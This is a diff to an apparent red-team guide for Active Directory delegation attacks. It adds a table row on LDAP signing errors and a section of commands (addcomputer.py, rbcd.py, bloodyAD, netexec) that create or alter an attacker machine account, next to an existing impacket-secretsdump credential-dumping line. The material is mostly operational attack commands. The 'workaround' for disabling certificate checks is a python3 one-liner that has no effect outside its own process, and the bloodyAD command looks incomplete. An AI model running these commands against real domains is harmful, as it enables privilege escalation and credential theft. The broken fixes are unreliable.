@@ -233,6 +233,21 @@ impacket-secretsdump -k -no-pass 'corp.local/Administrator@sql01.corp.local'
 | KDC_ERR_BADOPTION                           | Transition (TRUSTED_TO_AUTH_FOR_   | user must authenticate to service via |
 |                                             | DELEGATION bit is missing).        | Kerberos first (cannot forge ticket). |
 +---------------------------------------------+------------------------------------+---------------------------------------+
+| LDAP_STRONG_AUTH_REQUIRED (0x8) during      | Domain Controller enforces LDAP    | Unencrypted LDAP on port 389 rejected.|
+| addcomputer.py or rbcd.py                   | Signing (LDAPServerIntegrity = 2)  | Force LDAPS over port 636 with -ssl:  |
+|                                             | or Channel Binding (CBT = 2).      | addcomputer.py ... -ssl -port 636     |
++---------------------------------------------+------------------------------------+---------------------------------------+
+```
+
+### Advanced Operator Workaround: Bypassing Self-Signed CA Certificate Validation in LDAPS
+When forcing `-ssl` with `addcomputer.py` or `rbcd.py`, Python's `ldap3` library may reject the connection if the Enterprise Root CA certificate is not in the system's local OpenSSL trust store:
+```bash
+# Workaround: Disable SSL certificate validation in Python environments:
+python3 -c "import ssl; ssl._create_default_https_context = ssl._create_unverified_context"
+
+# Or pass LDAPS directly using bloodyAD / netexec:
+bloodyAD.py -d corp.local -u jdoe -p 'Pass123!' --host 10.0.0.1 -s add uac "ATTACKCOMP$"
+nxc ldap 10.0.0.1 -u jdoe -p 'Pass123!' -M add-computer -o NAME=ATTACKCOMP$ PASSWORD=Pass --ssl
 ```
 
 ---
